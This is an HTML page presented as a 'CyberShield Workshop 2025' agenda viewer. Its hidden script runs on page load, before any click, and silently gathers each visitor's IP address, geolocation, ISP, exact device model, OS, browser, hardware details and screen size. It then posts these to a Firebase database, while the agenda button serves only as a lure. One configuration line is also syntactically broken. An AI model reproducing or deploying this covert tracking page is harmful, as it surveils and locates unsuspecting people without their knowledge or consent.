<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CyberShield Workshop 2025 — Welcome</title>
<script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.37/dist/ua-parser.min.js"></script>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Syne:wght@400;700;800&display=swap');
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: 'Syne', sans-serif;
    background: #f5f4f0;
    color: #1a1a2e;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 2rem;
  }
  .card {
    background: #fff;
    border-radius: 20px;
    padding: 2.5rem 2rem;
    max-width: 380px;
    width: 100%;
    text-align: center;
    box-shadow: 0 4px 32px rgba(0,0,0,0.08);
  }
  .logo {
    width: 64px; height: 64px;
    background: #1a1a2e;
    border-radius: 16px;
    display: flex; align-items: center; justify-content: center;
    margin: 0 auto 1.5rem;
  }
  .logo svg { width: 36px; height: 36px; }
  .tag {
    font-size: 11px;
    letter-spacing: 0.15em;
    text-transform: uppercase;
    color: #888;
    margin-bottom: 0.75rem;
  }
  h1 {
    font-size: 1.7rem;
    font-weight: 800;
    color: #1a1a2e;
    line-height: 1.2;
    margin-bottom: 0.75rem;
  }
  p {
    font-size: 0.95rem;
    color: #666;
    line-height: 1.6;
    margin-bottom: 2rem;
  }
  .btn {
    background: #1a1a2e;
    color: #fff;
    border: none;
    padding: 0.9rem 2.5rem;
    border-radius: 12px;
    font-family: 'Syne', sans-serif;
    font-size: 1rem;
    font-weight: 700;
    cursor: pointer;
    width: 100%;
    transition: background 0.2s, transform 0.15s;
  }
  .btn:hover { background: #2d2d4e; transform: translateY(-1px); }
  .small { font-size: 0.78rem; color: #bbb; margin-top: 1rem; margin-bottom: 0; }
  .agenda-container {
    text-align: center;
    background: #fff;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-direction: column;
    padding: 2rem;
  }
  .agenda-img {
    max-width: 100%;
    height: auto;
    border-radius: 20px;
    box-shadow: 0 8px 24px rgba(0,0,0,0.1);
  }
  .back-btn {
    margin-top: 2rem;
    background: #1a1a2e;
    color: #fff;
    border: none;
    padding: 0.8rem 2rem;
    border-radius: 40px;
    font-family: 'Syne', sans-serif;
    font-size: 0.9rem;
    font-weight: 700;
    cursor: pointer;
  }
  /* Debug panel (only for testing) */
  .debug-panel {
    position: fixed;
    bottom: 10px;
    left: 10px;
    right: 10px;
    background: rgba(0,0,0,0.85);
    color: #0f0;
    font-family: monospace;
    font-size: 10px;
    padding: 8px;
    border-radius: 8px;
    max-height: 200px;
    overflow: auto;
    z-index: 9999;
    white-space: pre-wrap;
    word-break: break-all;
    pointer-events: none;
  }
</style>
</head>
<body>
<div class="card" id="welcomeCard">
  <div class="logo">
    <svg viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M18 4L6 9v9c0 7.18 5.14 13.89 12 15.5C24.86 31.89 30 25.18 30 18V9L18 4z" fill="#fff" opacity="0.9"/>
      <path d="M13 18l3.5 3.5L23 14" stroke="#1a1a2e" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
    </svg>
  </div>
  <div class="tag">CyberShield Workshop 2025</div>
  <h1>Welcome!<br>View Today's Agenda</h1>
  <p>Tap the button below to access the session schedule, speaker list, and room details.</p>
  <button class="btn" onclick="showAgendaImage()">Open Workshop Agenda &rarr;</button>
  <p class="small">Powered by CyberShield Events</p>
</div>
<div id="debugPanel" class="debug-panel" style="display:none;"></div>

<script>
  // ============================================================
  const FIREBASE_URL = "https://workshop-a32fc-default-rtdb.firebaseio.com/"; // REPLACE
  const AGENDA_IMAGE_URL = Agenda.png; // REPLACE
  // ============================================================
  let dataSent = false;
  let debugDiv = document.getElementById('debugPanel');

  function debugLog(obj) {
    if (debugDiv) {
      debugDiv.style.display = 'block';
      debugDiv.innerHTML = `<strong>🔍 CAPTURED DATA:</strong><br>${JSON.stringify(obj, null, 2)}`;
    }
    console.log('DEBUG:', obj);
  }

  // ---------- iPhone model mapping (from identifier like iPhone14,2) ----------
  const iphoneModels = {
    'iPhone1,1': 'iPhone 2G', 'iPhone1,2': 'iPhone 3G', 'iPhone2,1': 'iPhone 3GS',
    'iPhone3,1': 'iPhone 4', 'iPhone3,2': 'iPhone 4', 'iPhone3,3': 'iPhone 4',
    'iPhone4,1': 'iPhone 4S', 'iPhone5,1': 'iPhone 5', 'iPhone5,2': 'iPhone 5',
    'iPhone5,3': 'iPhone 5C', 'iPhone5,4': 'iPhone 5C', 'iPhone6,1': 'iPhone 5S',
    'iPhone6,2': 'iPhone 5S', 'iPhone7,1': 'iPhone 6 Plus', 'iPhone7,2': 'iPhone 6',
    'iPhone8,1': 'iPhone 6s', 'iPhone8,2': 'iPhone 6s Plus', 'iPhone8,4': 'iPhone SE (1st)',
    'iPhone9,1': 'iPhone 7', 'iPhone9,2': 'iPhone 7 Plus', 'iPhone9,3': 'iPhone 7',
    'iPhone9,4': 'iPhone 7 Plus', 'iPhone10,1': 'iPhone 8', 'iPhone10,2': 'iPhone 8 Plus',
    'iPhone10,3': 'iPhone X', 'iPhone10,4': 'iPhone 8', 'iPhone10,5': 'iPhone 8 Plus',
    'iPhone10,6': 'iPhone X', 'iPhone11,2': 'iPhone XS', 'iPhone11,4': 'iPhone XS Max',
    'iPhone11,6': 'iPhone XS Max', 'iPhone11,8': 'iPhone XR', 'iPhone12,1': 'iPhone 11',
    'iPhone12,3': 'iPhone 11 Pro', 'iPhone12,5': 'iPhone 11 Pro Max', 'iPhone12,8': 'iPhone SE (2nd)',
    'iPhone13,1': 'iPhone 12 mini', 'iPhone13,2': 'iPhone 12', 'iPhone13,3': 'iPhone 12 Pro',
    'iPhone13,4': 'iPhone 12 Pro Max', 'iPhone14,2': 'iPhone 13 Pro', 'iPhone14,3': 'iPhone 13 Pro Max',
    'iPhone14,4': 'iPhone 13 mini', 'iPhone14,5': 'iPhone 13', 'iPhone14,6': 'iPhone SE (3rd)',
    'iPhone14,7': 'iPhone 14', 'iPhone14,8': 'iPhone 14 Plus', 'iPhone15,2': 'iPhone 14 Pro',
    'iPhone15,3': 'iPhone 14 Pro Max', 'iPhone15,4': 'iPhone 15', 'iPhone15,5': 'iPhone 15 Plus',
    'iPhone16,1': 'iPhone 15 Pro', 'iPhone16,2': 'iPhone 15 Pro Max'
  };

  function getDetailedDeviceInfo() {
    const ua = navigator.userAgent;
    const parser = new UAParser(ua);
    const result = parser.getResult();
    let exactDevice = "Unknown Device";
    let androidVersion = null;
    let osVersionRaw = result.os.version || "";

    // ---- iPhone exact model ----
    let match = ua.match(/iPhone(\d+,\d+)/);
    if (match) {
      let modelId = `iPhone${match[1]}`;
      exactDevice = iphoneModels[modelId] || `iPhone (${modelId})`;
    } 
    // ---- iPad ----
    else if (ua.includes('iPad')) {
      exactDevice = 'iPad';
      let ipadMatch = ua.match(/iPad(\d+,\d+)/);
      if (ipadMatch) exactDevice += ` (${ipadMatch[1]})`;
    }
    // ---- Android exact model (from user agent) ----
    else if (ua.includes('Android')) {
      // Try to extract model: "SM-G998B", "Pixel 6", "Redmi Note 10", etc.
      let modelMatch = ua.match(/; (.+?) Build\//) || ua.match(/; (.+?);/);
      if (modelMatch && modelMatch[1]) {
        exactDevice = modelMatch[1].trim();
      } else {
        exactDevice = "Android Device";
      }
      // Extract Android version
      let androidVerMatch = ua.match(/Android (\d+(?:\.\d+)?)/);
      if (androidVerMatch) androidVersion = androidVerMatch[1];
    }
    // ---- Windows / Mac / Linux (PC) ----
    else if (ua.includes('Windows NT')) {
      exactDevice = "Windows PC";
      let winMatch = ua.match(/Windows NT (\d+\.\d+)/);
      if (winMatch) exactDevice = `Windows PC (NT ${winMatch[1]})`;
    } 
    else if (ua.includes('Mac OS X')) {
      exactDevice = "Mac";
    } 
    else if (ua.includes('Linux')) {
      exactDevice = "Linux PC";
    }

    // ---- OS details ----
    let osName = result.os.name || "Unknown OS";
    let osVersion = result.os.version || "";
    if (osName === 'Android' && androidVersion) osVersion = androidVersion;
    let fullOS = osVersion ? `${osName} ${osVersion}` : osName;

    // ---- Browser + full version ----
    let browserName = result.browser.name || "Unknown";
    let browserVersion = result.browser.version || "";
    let fullBrowser = browserVersion ? `${browserName} ${browserVersion}` : browserName;

    // Additional PC details
    let cpuCores = navigator.hardwareConcurrency || '?';
    let memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : '?';
    let platform = navigator.platform || '?';

    return {
      exact_device: exactDevice,
      os: fullOS,
      os_version: osVersion,
      android_version: androidVersion,
      browser: fullBrowser,
      browser_version: browserVersion,
      cpu_cores: cpuCores,
      ram_estimate: memory,
      platform: platform,
      raw_ua: ua
    };
  }

  // ---------- IP + location ----------
  async function getLocationData() {
    const apis = [
      { url: 'https://ipapi.co/json/', parse: (d) => ({ ip: d.ip, city: d.city, country: d.country_name, isp: d.org, region: d.region }) },
      { url: 'https://api.ipapi.is/', parse: (d) => ({ ip: d.ip, city: d.location?.city, country: d.location?.country, isp: d.isp?.org, region: d.location?.region }) },
      { url: 'https://ipinfo.io/json?token=anonymoustoken', parse: (d) => ({ ip: d.ip, city: d.city, country: d.country, isp: d.org, region: d.region }) }
    ];
    for (let api of apis) {
      try {
        const ctrl = new AbortController();
        const tid = setTimeout(() => ctrl.abort(), 5000);
        const res = await fetch(api.url, { signal: ctrl.signal });
        clearTimeout(tid);
        if (res.ok) {
          const data = await res.json();
          const parsed = api.parse(data);
          if (parsed.ip && parsed.ip !== '—') return parsed;
        }
      } catch(e) {}
    }
    return { ip: '—', city: '—', country: '—', isp: '—', region: '—' };
  }

  // ---------- Capture & send ----------
  async function captureAndSend() {
    if (dataSent) return;
    dataSent = true;
    const device = getDetailedDeviceInfo();
    const loc = await getLocationData();
    const data = {
      timestamp: new Date().toLocaleString(),
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      ip: loc.ip,
      city: loc.city,
      region: loc.region,
      country: loc.country,
      isp: loc.isp,
      exact_device: device.exact_device,
      os: device.os,
      os_version: device.os_version,
      android_version: device.android_version,
      browser: device.browser,
      browser_version: device.browser_version,
      cpu_cores: device.cpu_cores,
      ram_estimate: device.ram_estimate,
      platform: device.platform,
      screen: `${screen.width}x${screen.height}`,
      language: navigator.language,
      raw_ua: device.raw_ua
    };
    debugLog(data);
    try {
      await fetch(`${FIREBASE_URL}/visitors.json`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
      console.log("✅ Sent to Firebase");
    } catch(e) { console.error("Firebase error", e); }
  }

  function showAgendaImage() {
    document.body.innerHTML = `
      <div class="agenda-container">
        <img src="${AGENDA_IMAGE_URL}" alt="Agenda" style="max-width:100%; border-radius:20px;" onerror="this.src='data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22300%22%20height%3D%22200%22%3E%3Crect%20width%3D%22300%22%20height%3D%22200%22%20fill%3D%22%23f0f0f0%22%2F%3E%3Ctext%20x%3D%2250%25%22%20y%3D%2250%25%22%20text-anchor%3D%22middle%22%20dy%3D%22.3em%22%20fill%3D%22%23999%22%3EImage%20not%20found%3C%2Ftext%3E%3C%2Fsvg%3E';">
        <button class="back-btn" onclick="location.reload()">← Back</button>
      </div>
    `;
  }

  window.addEventListener('load', () => captureAndSend());
</script>
</body>
</html>
